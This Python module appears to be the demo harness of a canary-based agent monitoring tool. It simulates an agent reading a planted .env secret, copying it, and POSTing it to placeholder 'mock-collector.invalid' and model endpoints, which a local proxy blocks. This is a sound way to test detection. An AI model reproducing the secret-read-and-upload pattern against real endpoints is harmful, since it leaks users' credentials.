"""Reproducible synthetic lifecycle across actual local process and socket boundaries."""

from __future__ import annotations

import argparse
import ctypes
import hashlib
import http.client
import json
import math
import os
import shlex
import signal
import subprocess
import sys
import threading
import time
from collections.abc import Iterator
from contextlib import ExitStack, contextmanager, suppress
from dataclasses import asdict, dataclass
from pathlib import Path
from types import FrameType
from uuid import uuid4

from .filesystem import absolute_path, open_directory
from .generator import create_canary
from .models import Action, Event
from .monitors import InotifyMonitor
from .network import BlockingProxy
from .report import redact_text, render_report
from .sdk import Observer
from .store import Store

LIFECYCLE = tuple(action.value for action in Action if action != Action.MONITOR_HEALTH)
MODEL_TARGET = "https://mock-model.invalid/v1/responses"
COLLECTOR_TARGET = "https://mock-collector.invalid/upload"


class DemoError(RuntimeError):
    """Incomplete demonstration; retained evidence never implies success."""


@dataclass(frozen=True, slots=True)
class DemoResult:
    directory: str
    state_dir: str
    run_id: str
    canary_id: str
    child_pid: int
    tool_pid: int
    actions: tuple[str, ...] = LIFECYCLE
    http_statuses: tuple[int, ...] = (403, 403)
    status: str = "complete"

    def to_dict(self) -> dict[str, object]:
        return dict(asdict(self))


def _write(path: Path, content: str) -> None:
    parent = open_directory(path.parent)
    try:
        fd = os.open(
            path.name, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o600, dir_fd=parent
        )
    finally:
        os.close(parent)
    with os.fdopen(fd, "w", encoding="utf-8") as stream:
        stream.write(redact_text(content) + "\n")
        stream.flush()
        os.fsync(stream.fileno())


def _reserve_directory(directory: str | Path | None) -> Path:
    target = absolute_path(directory or f"agentcanary-demo-{uuid4().hex[:12]}")
    # Validate report labels before changing the filesystem.
    Event(action=Action.MONITOR_HEALTH, source="demo", destination=str(target))
    parent = open_directory(target.parent)
    try:
        os.mkdir(target.name, mode=0o700, dir_fd=parent)
    finally:
        os.close(parent)
    return target


def _interrupt(signum: int, frame: FrameType | None) -> None:
    raise KeyboardInterrupt


@contextmanager
def _termination_handler() -> Iterator[None]:
    # A library caller in another thread retains control of signal handling.
    if threading.current_thread() is not threading.main_thread():
        yield
        return
    previous = signal.getsignal(signal.SIGTERM)
    signal.signal(signal.SIGTERM, _interrupt)
    try:
        yield
    finally:
        signal.signal(signal.SIGTERM, previous)


def _stop_child(child: subprocess.Popen[bytes]) -> None:
    # The controlled child unwinds subprocess.run on SIGTERM, killing/reaping its
    # tool. Signal the entire owned session's group so tool descendants also stop.
    with suppress(ProcessLookupError):
        os.killpg(child.pid, signal.SIGTERM)
    try:
        child.wait(timeout=2)
    except subprocess.TimeoutExpired:
        with suppress(ProcessLookupError):
            os.killpg(child.pid, signal.SIGKILL)
        child.wait(timeout=2)
    # Also cover a child that failed after starting a tool but before waiting.
    with suppress(ProcessLookupError):
        os.killpg(child.pid, signal.SIGKILL)


def _own_descendants() -> None:
    # Only the disposable child becomes a Linux subreaper, never the SDK caller.
    # Orphaned tool grandchildren can then be waited for instead of leaking zombies.
    libc = ctypes.CDLL(None, use_errno=True)
    prctl = libc.prctl
    prctl.argtypes = [ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong]
    prctl.restype = ctypes.c_int
    if prctl(36, 1, 0, 0, 0) != 0:  # PR_SET_CHILD_SUBREAPER
        raise DemoError("child descendant ownership unavailable")


def _reap_tools() -> None:
    # Called only inside our dedicated child, so every descendant is owned here.
    # Ignore repeated interrupts while terminating and reaping those descendants.
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    deadline = time.monotonic() + 1.5
    children = Path(f"/proc/self/task/{os.getpid()}/children")
    while True:
        try:
            pid, _ = os.waitpid(-1, os.WNOHANG)
        except ChildProcessError:
            return
        if pid:
            continue
        if time.monotonic() >= deadline:
            raise DemoError("tool descendants did not stop")
        for value in children.read_text().split():
            with suppress(ProcessLookupError):
                os.kill(int(value), signal.SIGKILL)
        # After parents exit, their children are adopted and killed on the next pass.
        time.sleep(0.005)


def _child_command(directory: Path, run_id: str, port: int) -> list[str]:
    return [
        sys.executable,
        "-m",
        "agentcanary.demo",
        "--child",
        str(directory),
        "--run-id",
        run_id,
        "--port",
        str(port),
    ]


def _check_workers(monitor: InotifyMonitor, proxy: BlockingProxy) -> None:
    monitor.check()
    proxy.check()
    if not (monitor.ready.is_set() and monitor.running and monitor.watch_count == 1):
        raise DemoError("filesystem coverage is unavailable")
    if not (proxy.ready.is_set() and proxy.running):
        raise DemoError("HTTP listener is unavailable")


def _verify_chain(events: list[Event], child_pid: int, run_id: str) -> None:
    if any(event.run_id != run_id for event in events):
        raise DemoError("event run correlation is incomplete")
    sdk = [event for event in events if event.source == "sdk"]
    if [event.action for event in sdk] != [
        Action.READ,
        Action.COPY,
        Action.TOOL_USE,
        Action.MODEL_REQUEST,
    ] or any(event.pid != child_pid for event in sdk):
        raise DemoError("ordered SDK chain or caller attribution is incomplete")
    passive = [event for event in events if event.source == "inotify"]
    if not passive or any(
        event.pid is not None or event.action != Action.READ for event in passive
    ):
        raise DemoError("passive read evidence is incomplete")
    http = [event for event in events if event.source == "http"]
    if [event.action for event in http] != [
        Action.EXFILTRATION,
        Action.MODEL_REQUEST,
        Action.EXFILTRATION,
    ] or any(event.pid is not None or event.metadata.get("blocked") is not True for event in http):
        raise DemoError("blocked HTTP chain or source attribution is incomplete")
    if not events or events[0].action != Action.CREATE:
        raise DemoError("creation evidence is missing")


def _export(directory: Path, store: Store | None, summary: dict[str, object]) -> None:
    if store is not None:
        events, canaries = store.events(), store.canaries()
        _write(directory / "events.jsonl", render_report(events, format="jsonl", canaries=canaries))
        _write(directory / "report.txt", render_report(events, canaries=canaries))
    # A complete summary is only written after every evidence export succeeds.
    _write(directory / "summary.json", json.dumps(summary, indent=2, sort_keys=True))


def run_demo(directory: str | Path | None = None, *, timeout: float = 15.0) -> DemoResult:
    """Retain a private new directory; fail unless all observation boundaries work.

    timeout bounds child execution and evidence collection, after worker startup.
    Worker shutdown and process reaping have their own finite API deadlines.
    """
    if not math.isfinite(timeout) or timeout <= 0:
        raise ValueError("demo timeout must be positive and finite")
    target = _reserve_directory(directory)
    run_id = str(uuid4())
    store: Store | None = None
    try:
        with _termination_handler(), ExitStack() as cleanup:
            store = Store(target / "state")
            canary = create_canary(
                store, target / "workspace", "source.env", kind="env", run_id=run_id
            )
            monitor = InotifyMonitor(store, target / "workspace", run_id=run_id)
            cleanup.callback(monitor.stop)
            monitor.start()
            proxy = BlockingProxy(store, run_id=run_id, read_timeout=2)
            cleanup.callback(proxy.stop)
            proxy.start()
            _check_workers(monitor, proxy)
            # cwd outside the source tree proves the installed package is importable.
            child = subprocess.Popen(
                _child_command(target, run_id, proxy.port),
                cwd=target,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
            cleanup.callback(_stop_child, child)
            deadline = time.monotonic() + timeout
            while True:
                _check_workers(monitor, proxy)
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise DemoError("simulated agent timed out")
                try:
                    code = child.wait(timeout=min(0.05, remaining))
                    break
                except subprocess.TimeoutExpired:
                    pass
            if code != 0:
                raise DemoError("simulated agent failed")
            while not any(
                event.source == "inotify"
                for event in store.events(canary_id=canary.id, action=Action.READ)
            ):
                _check_workers(monitor, proxy)
                if time.monotonic() >= deadline:
                    raise DemoError("passive read evidence did not arrive")
                time.sleep(0.01)
            _check_workers(monitor, proxy)
            _verify_chain(store.events(canary_id=canary.id), child.pid, run_id)
            receipt = json.loads((target / "child.json").read_text())
            tool = json.loads((target / "tool.json").read_text())
            if receipt != {"pid": child.pid, "http_statuses": [403, 403]}:
                raise DemoError("child completion evidence is invalid")
            if (
                type(tool.get("pid")) is not int
                or tool["pid"] <= 0
                or tool["pid"] in (child.pid, os.getpid())
                or tool.get("sha256") != canary.sha256
                or hashlib.sha256((target / "workspace/copy.env").read_bytes()).hexdigest()
                != canary.sha256
            ):
                raise DemoError("tool or copy completion evidence is invalid")
            result = DemoResult(
                str(target), str(target / "state"), run_id, canary.id, child.pid, tool["pid"]
            )
        _export(target, store, result.to_dict())
        return result
    except BaseException as exc:
        # Best effort reports must not replace a sink/shutdown error with success.
        with suppress(Exception):
            _write(
                target / "summary.json",
                json.dumps(
                    {"status": "failed", "run_id": run_id, "error_code": type(exc).__name__}
                ),
            )
        if store is not None:
            for name, format in (("events.jsonl", "jsonl"), ("report.txt", "text")):
                with suppress(Exception):
                    _write(
                        target / name,
                        render_report(store.events(), format=format, canaries=store.canaries()),
                    )
        if not isinstance(exc, Exception):
            raise
        reason = str(exc) if isinstance(exc, DemoError) else type(exc).__name__
        raise DemoError(f"demo failed ({reason}); evidence retained at {target}") from None


def describe(result: DemoResult) -> str:
    command = shlex.join(["agentcanary", "--state-dir", result.state_dir, "report"])
    return redact_text(
        f"Demo complete: {' → '.join(result.actions)}\n"
        f"Evidence: {result.directory}\nRun: {result.run_id}\n"
        f"Agent PID: {result.child_pid}; tool PID: {result.tool_pid}; HTTP: 403, 403\n"
        f"Passive and HTTP actor PIDs remain unknown.\nInspect: {command}"
    )


def _simulate(directory: Path, run_id: str, port: int) -> None:
    observer = Observer(Store(directory / "state"), run_id=run_id)
    source = directory / "workspace/source.env"
    payload = observer.read(source)
    observer.copy(source, directory / "workspace/copy.env")
    # Controlled tool consumes stdin, emits no content, and leaves a bounded receipt.
    tool = observer.run_tool(
        [
            sys.executable,
            "-c",
            "import hashlib,json,os,sys; from pathlib import Path; "
            "data=sys.stdin.buffer.read(); "
            "receipt={'pid':os.getpid(),'sha256':hashlib.sha256(data).hexdigest()}; "
            "Path(sys.argv[1]).write_text(json.dumps(receipt))",
            str(directory / "tool.json"),
        ],
        input=payload,
        tool="demo-consumer",
        timeout=5,
    )
    if tool.returncode != 0:
        raise DemoError("local tool failed")
    observer.observe_model(payload, destination=MODEL_TARGET)
    statuses = []
    for target in (MODEL_TARGET, COLLECTOR_TARGET):
        # The absolute target is only an HTTP request label. The connection is literal loopback.
        connection = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
        try:
            connection.request("POST", target, body=payload, headers={"Content-Type": "text/plain"})
            response = connection.getresponse()
            response.read()
            statuses.append(response.status)
        finally:
            connection.close()
    if statuses != [403, 403]:
        raise DemoError("HTTP requests were not blocked")
    _write(directory / "child.json", json.dumps({"pid": os.getpid(), "http_statuses": statuses}))


def _main() -> int:
    parser = argparse.ArgumentParser(description="Internal controlled demo child")
    parser.add_argument("--child", type=Path, required=True)
    parser.add_argument("--run-id", required=True)
    parser.add_argument("--port", type=int, required=True)
    args = parser.parse_args()
    try:
        with _termination_handler():
            _own_descendants()
            try:
                _simulate(args.child, args.run_id, args.port)
            finally:
                _reap_tools()
        return 0
    except (Exception, KeyboardInterrupt):
        return 2


if __name__ == "__main__":
    raise SystemExit(_main())
